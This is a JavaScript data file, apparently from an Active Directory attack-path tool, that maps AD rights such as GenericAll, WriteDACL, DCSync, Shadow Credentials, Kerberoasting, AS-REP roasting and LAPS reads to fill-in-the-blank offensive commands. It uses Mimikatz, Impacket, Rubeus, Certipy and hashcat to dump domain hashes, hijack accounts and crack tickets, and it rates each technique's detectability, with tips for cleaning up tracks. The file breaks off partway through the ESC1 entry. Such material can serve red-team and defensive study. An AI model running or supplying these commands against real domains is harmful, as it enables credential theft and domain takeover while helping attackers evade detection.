const GRAPH_HINTS = {
    rights: {
        'GenericAll': {
            name: 'GenericAll',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 10.0,
            noise: 8.5,
            noise_reason: 'Password reset, DACL modification and SPN changes generate multiple Security/Directory Service events (4723, 4724, 5136) easily correlated by SIEM',
            description: 'Full control over the target object',
            impact: 'Allows complete takeover of target (user password reset, group membership, resource access)',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Set-ADAccountPassword -Identity "{target}" -NewPassword (ConvertTo-SecureString "{password}" -AsPlainText -Force) -Reset',
                    desc: 'Force change password (fastest)'
                },
                {
                    type: 'Windows CMD',
                    cmd: 'net user {target} {password} /domain',
                    desc: 'Legacy method to reset password'
                },
                {
                    type: 'Windows',
                    cmd: 'Whisker.exe add /target:{target}',
                    desc: 'Shadow Credentials abuse'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainGroupMember -Identity "{target}" -Members {attacker}',
                    desc: 'Add attacker to target group'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity "{target}" -PrincipalIdentity {attacker} -Rights DCSync',
                    desc: 'Grant DCSync rights via DACL modification'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{serviceprincipalname="HTTP/evil.{domain}"}',
                    desc: 'Set SPN for Kerberoasting attack'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 rbcd.py -delegate-to "{target}$" -delegate-from "{attacker}$" -action write {domain}/{attacker}:{password} -dc-ip {dc_ip}',
                    desc: 'RBCD — Resource-Based Constrained Delegation abuse'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 owneredit.py -action write -new-owner {attacker} -target {target} {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Change owner of target object'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe asktgt /user:{target} /certificate:<base64> /password:<pass> /domain:{domain} /getcredentials /ptt',
                    desc: 'Request TGT after Shadow Credentials and pass-the-ticket'
                },
                {
                    type: 'BloodHound CLI',
                    cmd: 'bloodhound-cli query "MATCH p=shortestPath(({name:\'{attacker}\'})-[r:GenericAll*1..]->(n)) RETURN p"',
                    desc: 'Enumerate GenericAll paths from attacker in BloodHound'
                }
            ]
        },
        'DS-Replication-Get-Changes-All': {
            name: 'DS-Replication-Get-Changes-All',
            guid: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
            risk: 'Critical',
            score: 10.0,
            noise: 7.0,
            noise_reason: 'DCSync triggers event 4662 on DC — detectable but only if DC auditing is properly configured; no network-level noise if done remotely',
            description: 'DCSync attack — dump NTLM hashes of all domain accounts',
            impact: 'Allows dumping password hashes for all users including krbtgt and Administrator without touching DC',
            commands: [
                {
                    type: 'Mimikatz',
                    cmd: 'lsadump::dcsync /domain:{domain} /user:{target}',
                    desc: 'Dump specific user hash'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'lsadump::dcsync /domain:{domain} /all /csv',
                    desc: 'Dump all domain hashes to CSV'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py {domain}/{attacker}:{password}@DC01.{domain}',
                    desc: 'Linux-based DCSync (full dump)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py -just-dc-user krbtgt {domain}/{attacker}:{password}@DC01.{domain}',
                    desc: 'Dump krbtgt hash for Golden Ticket'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py -just-dc-user Administrator {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Dump Administrator hash only'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {dc_ip} -u {attacker} -p {password} --ntds drsuapi',
                    desc: 'DCSync via CME NTDS dump'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'lsadump::dcsync /domain:{domain} /user:krbtgt',
                    desc: 'Dump krbtgt for Golden Ticket (Mimikatz)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-DCSync -DumpForest | Export-Csv -Path hashes.csv -NoTypeInformation',
                    desc: 'PowerShell Empire DCSync module'
                },
                {
                    type: 'Metasploit',
                    cmd: 'use auxiliary/admin/smb/dcsync; set RHOSTS {dc_ip}; set SMBUser {attacker}; set SMBPass {password}; run',
                    desc: 'DCSync via Metasploit module'
                },
                {
                    type: 'SharpSecDump',
                    cmd: 'SharpSecDump.exe -target={dc_ip} -u={attacker} -p={password} -d={domain}',
                    desc: 'C# DCSync tool'
                }
            ]
        },
        'Write-msDS-KeyCredentialLink': {
            name: 'Write-msDS-KeyCredentialLink',
            guid: '5b47d60f-6090-40b2-9f37-2a4de88f3063',
            risk: 'Critical',
            score: 10.0,
            noise: 5.0,
            noise_reason: 'Shadow Credentials write generates event 5136 (LDAP attribute change) — low noise if PKINIT auth is normal in the environment; Rubeus TGT request is silent',
            description: 'Shadow Credentials attack',
            impact: 'Write msDS-KeyCredentialLink to impersonate target via PKINIT',
            commands: [
                {
                    type: 'Windows',
                    cmd: 'Whisker.exe add /target:{target} /domain:{domain} /dc:DC01.{domain}',
                    desc: 'Add Shadow Credentials (Whisker)'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe asktgt /user:{target} /certificate:<base64> /password:<pass> /domain:{domain} /getcredentials',
                    desc: 'Get TGT with certificate and extract NTLM'
                },
                {
                    type: 'Linux',
                    cmd: 'certipy shadow auto -u {attacker}@{domain} -p {password} -account {target}',
                    desc: 'Full Shadow Credentials attack (Certipy)'
                },
                {
                    type: 'Linux',
                    cmd: 'certipy shadow add -u {attacker}@{domain} -p {password} -account {target} -device-id <uuid>',
                    desc: 'Add KeyCredential manually'
                },
                {
                    type: 'PowerShell',
                    cmd: 'python3 pywhisker.py -d {domain} -u {attacker} -p {password} --target {target} --action add',
                    desc: 'pyWhisker cross-platform alternative'
                },
                {
                    type: 'PowerShell',
                    cmd: 'python3 gettgtpkinit.py {domain}/{target} -cert-pfx {target}.pfx -pfx-pass <pass> {target}.ccache',
                    desc: 'Get TGT using PKINIT after Shadow Credentials'
                },
                {
                    type: 'Impacket',
                    cmd: 'KRB5CCNAME={target}.ccache python3 secretsdump.py -k -no-pass {domain}/{target}@DC01.{domain}',
                    desc: 'Dump secrets with obtained TGT'
                },
                {
                    type: 'Windows',
                    cmd: 'Whisker.exe list /target:{target} /domain:{domain}',
                    desc: 'List existing KeyCredentials on target'
                }
            ]
        },
        'WriteDACL': {
            name: 'WriteDACL',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 9.8,
            noise: 7.5,
            noise_reason: 'DACL modification generates event 4670 (permissions changed) — very detectable by advanced SIEMs monitoring ACL changes on sensitive objects like domain root',
            description: 'Modify target DACL to grant yourself rights',
            impact: 'Allows adding DCSync, GenericAll, or other dangerous permissions to attacker',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity "DC={domain_dns}" -PrincipalIdentity {attacker} -Rights DCSync',
                    desc: 'Grant DCSync rights to attacker'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {attacker} -Rights All',
                    desc: 'Grant full GenericAll control to attacker'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 dacledit.py -action write -rights FullControl -principal {attacker} -target {target} {domain}/{attacker}:{password}@DC01.{domain}',
                    desc: 'Remote DACL modification (Linux)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 dacledit.py -action write -rights DCSync -principal {attacker} -target-dn "DC={domain_dns}" {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Grant DCSync rights on domain object remotely'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {attacker} -Rights WriteMembers',
                    desc: 'Grant WriteMembers right to add users to group'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {attacker} -Rights ResetPassword',
                    desc: 'Grant password reset right on user object'
                },
                {
                    type: 'SharpACL',
                    cmd: 'SharpACL.exe --action addACE --principal {attacker} --target {target} --right GenericAll --domain {domain}',
                    desc: 'Add ACE using SharpACL'
                },
                {
                    type: 'PowerShell',
                    cmd: '$Acl = Get-Acl -Path "AD:\\{target}"; $Ace = New-Object DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]"{attacker}","GenericAll","Allow"); $Acl.AddAccessRule($Ace); Set-Acl -Path "AD:\\{target}" -AclObject $Acl',
                    desc: 'Raw .NET DACL modification'
                }
            ]
        },
        'GenericWrite': {
            name: 'GenericWrite',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 9.5,
            noise: 6.0,
            noise_reason: 'Attribute write (SPN, logon script) triggers event 5136; SPN addition may alert on Kerberoast detection tools but individual writes are low-volume',
            description: 'Write any attribute on target',
            impact: 'Can set SPN for Kerberoasting, Shadow Credentials, or logon script',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{serviceprincipalname="HTTP/evil"}',
                    desc: 'Set SPN for targeted Kerberoasting'
                },
                {
                    type: 'Windows',
                    cmd: 'Whisker.exe add /target:{target}',
                    desc: 'Shadow Credentials attack'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-ADUser -Identity {target} -ScriptPath "\\\\attacker\\share\\evil.ps1"',
                    desc: 'Set logon script for code execution on next login'
                },
                {
                    type: 'Linux',
                    cmd: 'certipy shadow auto -u {attacker}@{domain} -p {password} -account {target}',
                    desc: 'Shadow Credentials via Certipy (Linux)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{admincount=1}',
                    desc: 'Set AdminCount=1 to protect account from AdminSDHolder'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 rbcd.py -delegate-to "{target}$" -delegate-from "{attacker}$" -action write {domain}/{attacker}:{password} -dc-ip {dc_ip}',
                    desc: 'Set msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$RawBytes}',
                    desc: 'RBCD via PowerView — set delegation attribute'
                },
                {
                    type: 'Windows CMD',
                    cmd: 'setspn -A cifs/evil.{domain} {domain}\\{target}',
                    desc: 'Add CIFS SPN for Kerberoasting'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{userAccountControl=512}',
                    desc: 'Enable account or clear flags'
                }
            ]
        },
        'WriteProperty': {
            name: 'WriteProperty',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 8.8,
            noise: 5.5,
            noise_reason: 'Group membership change generates events 4728/4732/4756 — moderate noise, often blends in with normal IT operations in large environments',
            description: 'Write a specific property on target',
            impact: 'Can add to group, set SPN, or modify other writable properties',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainGroupMember -Identity "{target}" -Members {attacker}',
                    desc: 'Add to group (group write)'
                },
                {
                    type: 'Windows CMD',
                    cmd: 'net group "{target}" {attacker} /add /domain',
                    desc: 'Legacy group membership add'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{serviceprincipalname="HTTP/evil"}',
                    desc: 'Set SPN for Kerberoasting'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 addmember.py -member {attacker} -group "{target}" {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Add to group remotely via Impacket'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-ADObject -Identity (Get-ADGroup "{target}") -Add @{member=(Get-ADUser {attacker}).DistinguishedName}',
                    desc: 'Native AD cmdlet group member add'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{description="{attacker} controlled"}',
                    desc: 'Write description attribute (info disclosure)'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} -M groupmem -o GROUP="{target}" ACTION=ADD MEMBER={attacker}',
                    desc: 'CME LDAP group member module'
                },
                {
                    type: 'Linux',
                    cmd: 'ldapmodify -H ldap://{dc_ip} -D "{attacker}@{domain}" -w {password} -f add_member.ldif',
                    desc: 'Native LDAP modification on Linux'
                }
            ]
        },
        'ForceChangePassword': {
            name: 'ForceChangePassword',
            guid: '00299570-246d-11d0-a768-00aa006e0529',
            risk: 'High',
            score: 7.5,
            noise: 9.0,
            noise_reason: 'Password reset without knowing old password generates event 4723/4724 and typically triggers account lockout policies or user helpdesk reports — very high operational noise',
            description: 'Change target user password without knowing current one',
            impact: 'Allows immediate takeover of target account by resetting password',
            commands: [
                {
                    type: 'Windows CMD',
                    cmd: 'net user {target} {password} /domain',
                    desc: 'Legacy password reset method'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-ADAccountPassword -Identity "{target}" -NewPassword (ConvertTo-SecureString "{password}" -AsPlainText -Force) -Reset',
                    desc: 'Modern PowerShell password reset'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainUserPassword -Identity {target} -AccountPassword (ConvertTo-SecureString "{password}" -AsPlainText -Force)',
                    desc: 'PowerView password reset'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 changepasswd.py {domain}/{attacker}:{password}@{dc_ip} -altuser {target} -newpass {password} -no-pass',
                    desc: 'Remote password change via RPC (Linux)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 smbpasswd.py -newpass {password} {domain}/{attacker}:{password}@{dc_ip} -altuser {target}',
                    desc: 'Password change via SMB protocol'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {dc_ip} -u {attacker} -p {password} -x "net user {target} {password} /domain"',
                    desc: 'Remote password change via CME exec'
                },
                {
                    type: 'rpcclient',
                    cmd: 'rpcclient -U "{domain}\\{attacker}%{password}" {dc_ip} -c "setuserinfo2 {target} 23 {password}"',
                    desc: 'Password change via rpcclient (Linux)'
                },
                {
                    type: 'PowerShell',
                    cmd: '$Cred = New-Object PSCredential("{domain}\\{attacker}", (ConvertTo-SecureString "{password}" -AsPlainText -Force)); Set-ADAccountPassword -Identity {target} -NewPassword (ConvertTo-SecureString "{password}" -AsPlainText -Force) -Reset -Credential $Cred',
                    desc: 'Password reset with explicit credentials'
                }
            ]
        },
        'AddMember': {
            name: 'AddMember',
            guid: 'bf9679c0-0de6-11d0-a285-00aa003049e2',
            risk: 'High',
            score: 7.0,
            noise: 6.5,
            noise_reason: 'Group membership changes log events 4728/4732; adding to privileged groups (Domain Admins) typically triggers high-severity SIEM alerts in mature environments',
            description: 'Add user to the target group',
            impact: 'Grants attacker membership in privileged group (Domain Admins, etc)',
            commands: [
                {
                    type: 'Windows CMD',
                    cmd: 'net group "{target}" {attacker} /add /domain',
                    desc: 'Add to group using net command'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainGroupMember -Identity "{target}" -Members {attacker} -Verbose',
                    desc: 'Add to group using PowerShell'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 addmember.py -member {attacker} -group "{target}" {domain}/{attacker}:{password}@DC01.{domain}',
                    desc: 'Remote group membership addition'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-ADGroupMember -Identity "{target}" -Members {attacker}',
                    desc: 'Native AD module group add'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} -M groupmem -o GROUP="{target}" ACTION=ADD MEMBER={attacker}',
                    desc: 'CME LDAP addmember module'
                },
                {
                    type: 'rpcclient',
                    cmd: 'rpcclient -U "{domain}\\{attacker}%{password}" {dc_ip} -c "samr_addgroupmember <group_rid> <user_rid>"',
                    desc: 'Add via SAMRPC protocol'
                },
                {
                    type: 'Linux',
                    cmd: 'ldapmodify -H ldap://{dc_ip} -D "{attacker}@{domain}" -w {password} -f add_member.ldif',
                    desc: 'Add via raw LDAP modify'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock { Add-ADGroupMember -Identity "{target}" -Members "{attacker}" }',
                    desc: 'Remote PowerShell group add via PSRemoting'
                }
            ]
        },
        'Self-Membership': {
            name: 'Self-Membership',
            guid: '05c74c5e-4deb-43b4-bf69-fa65ac53a05e',
            risk: 'High',
            score: 7.0,
            noise: 6.0,
            noise_reason: 'Self-add to group generates same 4728/4732 events as AddMember; slightly less suspicious than admin-initiated add but still detectable via UBA tools',
            description: 'Add yourself to the target group',
            impact: 'Attacker gains membership in target group privileges',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainGroupMember -Identity "{target}" -Members {attacker}',
                    desc: 'Add attacker to target group'
                },
                {
                    type: 'Windows CMD',
                    cmd: 'net group "{target}" {attacker} /add /domain',
                    desc: 'Legacy group add command'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-ADGroupMember -Identity "{target}" -Members (Get-ADUser {attacker})',
                    desc: 'Native AD cmdlet self-add'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 addmember.py -member {attacker} -group "{target}" {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Remote self-add via Impacket'
                },
                {
                    type: 'Linux',
                    cmd: 'ldapmodify -H ldap://{dc_ip} -D "{attacker}@{domain}" -w {password} -f self_add.ldif',
                    desc: 'Self-add via LDAP modify'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} -M groupmem -o GROUP="{target}" ACTION=ADD MEMBER={attacker}',
                    desc: 'CME LDAP self-membership'
                }
            ]
        },
        'Kerberoastable': {
            name: 'Kerberoastable',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 8.0,
            noise: 3.5,
            noise_reason: 'TGS request is legitimate Kerberos traffic (event 4769) — blends well with normal service auth; only suspicious if many TGS requests are made in short time (bulk roasting)',
            description: 'Target has SPN and can be Kerberoasted',
            impact: 'TGS ticket can be requested and cracked offline to obtain plaintext password',
            commands: [
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe kerberoast /user:{target} /outfile:kerberoast.txt',
                    desc: 'Request TGS and save hashes'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 GetUserSPNs.py {domain}/{attacker}:{password} -request -outputfile kerberoast.txt',
                    desc: 'Remote Kerberoasting (all accounts)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 GetUserSPNs.py {domain}/{attacker}:{password} -request-user {target} -outputfile kerberoast.txt',
                    desc: 'Targeted Kerberoasting for specific user'
                },
                {
                    type: 'Hashcat',
                    cmd: 'hashcat -m 13100 kerberoast.txt wordlist.txt --force',
                    desc: 'Crack TGS-REP hash (RC4)'
                },
                {
                    type: 'Hashcat',
                    cmd: 'hashcat -m 19700 kerberoast.txt wordlist.txt --force',
                    desc: 'Crack TGS-REP hash (AES-128)'
                },
                {
                    type: 'Hashcat',
                    cmd: 'hashcat -m 19800 kerberoast.txt wordlist.txt --force',
                    desc: 'Crack TGS-REP hash (AES-256)'
                },
                {
                    type: 'John',
                    cmd: 'john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt',
                    desc: 'Alternative cracking with John'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-Kerberoast -Identity {target} | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII kerberoast.txt',
                    desc: 'PowerView Invoke-Kerberoast'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} --kerberoasting kerberoast.txt',
                    desc: 'CME Kerberoasting module'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:kerberoast.txt',
                    desc: 'Kerberoast with RC4 downgrade opsec'
                }
            ]
        },
        'AS-REP Roasting': {
            name: 'AS-REP Roasting',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 7.5,
            noise: 2.5,
            noise_reason: 'AS-REQ without pre-auth is a normal unauthenticated Kerberos request — nearly invisible in logs (event 4768 with no pre-auth flag); offline cracking leaves zero network trace',
            description: 'Target has pre-auth disabled',
            impact: 'AS-REP hash can be requested and cracked to obtain plaintext password',
            commands: [
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt',
                    desc: 'Request AS-REP hashes (all vulnerable accounts)'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe asreproast /user:{target} /format:hashcat /outfile:asrep.txt /nowrap',
                    desc: 'Targeted AS-REP roast for specific user'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 GetNPUsers.py {domain}/{attacker}:{password} -request -format hashcat -outputfile asrep.txt',
                    desc: 'Remote AS-REP collection (authenticated)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt',
                    desc: 'Unauthenticated AS-REP roasting with user list'
                },
                {
                    type: 'Hashcat',
                    cmd: 'hashcat -m 18200 asrep.txt wordlist.txt --force',
                    desc: 'Crack AS-REP hash'
                },
                {
                    type: 'John',
                    cmd: 'john --format=krb5asrep asrep.txt --wordlist=wordlist.txt',
                    desc: 'Crack AS-REP with John'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} --asreproast asrep.txt',
                    desc: 'CME AS-REP roast module'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol',
                    desc: 'Enumerate users with pre-auth disabled'
                },
                {
                    type: 'Linux',
                    cmd: 'kerbrute userenum -d {domain} --dc {dc_ip} users.txt --downgrade',
                    desc: 'Kerbrute AS-REP roast enumeration'
                }
            ]
        },
                'ASREP': {
                    name: 'ASREP',
                    guid: '00000000-0000-0000-0000-000000000000',
                    risk: 'High',
                    score: 7.5,
                    noise: 2.5,
                    noise_reason: 'Same as AS-REP Roasting — unauthenticated AS-REQ generates only event 4768 without pre-auth flag; no network trace for offline cracking; nearly invisible in most environments',
                    description: 'Alias for AS-REP Roasting (pre-auth disabled)',
                    impact: 'AS-REP hash can be requested and cracked to obtain plaintext password',
                    commands: [
                        {
                            type: 'Windows',
                            cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt',
                            desc: 'Request AS-REP hashes (all vulnerable accounts)'
                        },
                        {
                            type: 'Windows',
                            cmd: 'Rubeus.exe asreproast /user:{target} /format:hashcat /outfile:asrep.txt /nowrap',
                            desc: 'Targeted AS-REP roast for specific user'
                        },
                        {
                            type: 'Impacket',
                            cmd: 'python3 GetNPUsers.py {domain}/{attacker}:{password} -request -format hashcat -outputfile asrep.txt',
                            desc: 'Remote AS-REP collection (authenticated)'
                        },
                        {
                            type: 'Impacket',
                            cmd: 'python3 GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt',
                            desc: 'Unauthenticated AS-REP roasting with user list'
                        },
                        {
                            type: 'Hashcat',
                            cmd: 'hashcat -m 18200 asrep.txt wordlist.txt --force',
                            desc: 'Crack AS-REP hash'
                        },
                        {
                            type: 'John',
                            cmd: 'john --format=krb5asrep asrep.txt --wordlist=wordlist.txt',
                            desc: 'Crack AS-REP with John'
                        },
                        {
                            type: 'CrackMapExec',
                            cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} --asreproast asrep.txt',
                            desc: 'CME AS-REP roast module'
                        },
                        {
                            type: 'PowerShell',
                            cmd: 'Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol',
                            desc: 'Enumerate users with pre-auth disabled'
                        },
                        {
                            type: 'Linux',
                            cmd: 'kerbrute userenum -d {domain} --dc {dc_ip} users.txt --downgrade',
                            desc: 'Kerbrute AS-REP roast enumeration'
                        }
                    ]
                },

                'Pwd-not-required': {
                    name: 'Pwd-not-required',
                    guid: '00000000-0000-0000-0000-000000000000',
                    risk: 'Medium',
                    score: 5.5,
                    noise: 1.5,
                    noise_reason: 'Purely a passive enumeration finding — no exploitation action generates events; LDAP query for userAccountControl bit is indistinguishable from normal AD recon traffic',
                    description: 'Account flag PASSWORD_NOT_REQUIRED is set',
                    impact: 'Accounts with this flag may allow weaker authentication or increase exposure; enumerate and remediate',
                    commands: [
                        {
                            type: 'PowerShell',
                            cmd: 'Get-DomainUser -PasswordNotRequired | Select-Object SamAccountName,userAccountControl',
                            desc: 'PowerView enumeration for password-not-required users'
                        },
                        {
                            type: 'PowerShell',
                            cmd: 'Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=32)" -Properties userAccountControl | Select-Object SamAccountName',
                            desc: 'AD module: list users with PASSWORD_NOT_REQUIRED bit set'
                        },
                        {
                            type: 'Linux',
                            cmd: 'ldapsearch -x -H ldap://{dc_ip} -b "DC={domain_dns}" "(userAccountControl:1.2.840.113556.1.4.803:=32)"',
                            desc: 'LDAP search for PASSWORD_NOT_REQUIRED bit (Linux)'
                        },
                        {
                            type: 'PowerShell',
                            cmd: 'Get-DomainUser -Filter {UserAccountControl -band 32} | Select-Object SamAccountName',
                            desc: 'PowerView alternative filter enumeration'
                        },
                        {
                            type: 'Remediation',
                            cmd: 'Set-ADUser -Identity {target} -Clear userAccountControl',
                            desc: 'Clear PASSWORD_NOT_REQUIRED flag (verify before applying)'
                        }
                    ]
                },
        'Validated-Write-SPN': {
            name: 'Validated-Write-SPN',
            guid: 'f3a64788-5306-11d1-a9c5-0000f80367c1',
            risk: 'Medium',
            score: 6.0,
            noise: 4.5,
            noise_reason: 'SPN registration via setspn generates event 5136 and may appear in setspn audit logs; subsequent TGS request is low noise but SPN addition itself is trackable',
            description: 'Add SPN to target for Kerberoasting',
            impact: 'Can create SPN on target account for targeted Kerberoasting attack',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Set @{serviceprincipalname="HTTP/evil.{domain}"}',
                    desc: 'Set SPN on target (PowerView)'
                },
                {
                    type: 'Windows',
                    cmd: 'setspn -A HTTP/evil.{domain} {domain}\\{target}',
                    desc: 'Set SPN using built-in setspn tool'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe kerberoast /user:{target} /outfile:hashes.txt',
                    desc: 'Kerberoast the newly set SPN'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-ADUser -Identity {target} -ServicePrincipalNames @{Add="HTTP/evil.{domain}"}',
                    desc: 'Set SPN via native AD cmdlet'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 GetUserSPNs.py {domain}/{attacker}:{password} -request-user {target} -outputfile hash.txt',
                    desc: 'Kerberoast new SPN remotely (Linux)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObject -Identity {target} -Clear serviceprincipalname',
                    desc: 'Clean up — remove SPN after attack (opsec)'
                },
                {
                    type: 'Windows CMD',
                    cmd: 'setspn -D HTTP/evil.{domain} {domain}\\{target}',
                    desc: 'Remove SPN to clean tracks'
                }
            ]
        },
        'msLAPS-Password': {
            name: 'msLAPS-Password',
            guid: 'e081f117-4944-4367-bb67-d5e2b56e3571',
            risk: 'Critical',
            score: 10.0,
            noise: 2.0,
            noise_reason: 'LDAP read of ms-Mcs-AdmPwd is a simple attribute query — no dedicated Windows event for reading this attribute; only detectable via LDAP query logging or LAPS audit (rarely enabled)',
            description: 'Read LAPS password',
            impact: 'Can read plaintext local admin password managed by Windows LAPS',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Get-LAPSComputers',
                    desc: 'Enumerate all LAPS-managed computers'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Get-AdmPwdPassword -ComputerName {target}',
                    desc: 'Get LAPS password for specific computer'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} --laps',
                    desc: 'Remote LAPS password dump via CME'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 lapsreader.py {domain}/{attacker}:{password}@{dc_ip} -computer {target}',
                    desc: 'Read LAPS password via LDAP (Linux)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Get-ADComputer -Identity {target} -Properties "ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime" | Select-Object name,"ms-Mcs-AdmPwd"',
                    desc: 'Read LAPS via native AD module'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} -M laps',
                    desc: 'Dump all LAPS passwords via LDAP module'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Get-DomainComputer -LDAPFilter "(ms-mcs-admpwd=*)" -Properties name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime',
                    desc: 'Enumerate all computers with LAPS password readable'
                },
                {
                    type: 'Windows',
                    cmd: 'SharpLAPS.exe /host:{target} /user:{domain}\\{attacker} /pass:{password}',
                    desc: 'C# LAPS password reader (SharpLAPS)'
                },
                {
                    type: 'Impacket',
                    cmd: 'crackmapexec smb {target} -u Administrator -H <laps_ntlm_hash> --local-auth',
                    desc: 'Use LAPS hash for local admin PTH'
                }
            ]
        },
        'ESC1': {
            name: 'ESC1 - SAN Spoofing',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 10.0,
            noise: 3.0,
            noise_reason: 'Certificate enrollment looks like legitimate PKI traffic; ADCS does not log SAN field by default — only detectable via CA Manager audit logs (event 4886) which are often ignored',
            description: 'Certificate template allows SAN spoofing',
            impact: 'Can request certificate for any user (including Domain Admin) via SAN field',
            commands: [
                {
